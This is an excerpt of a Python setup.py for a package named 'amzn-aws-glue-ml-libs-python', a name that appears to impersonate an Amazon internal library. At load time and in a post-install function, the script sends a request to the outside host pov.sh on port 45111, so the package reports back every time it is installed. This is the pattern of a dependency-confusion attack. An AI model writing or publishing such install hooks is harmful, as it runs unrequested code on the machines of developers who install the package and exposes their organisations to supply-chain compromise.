...
requests.get("http://pov.sh:45111/api/v3/amzn-aws-glue-ml-libs-python")
# Define the post-installation function
def post_install():
    # Example request to your server (replace with your actual endpoint)
    response = requests.get("http://pov.sh:45111/api/v3/amzn-aws-glue-ml-libs-python")
...
setup(
    name="amzn-aws-glue-ml-libs-python",
    version="6.1.5",
    author="Your Name",
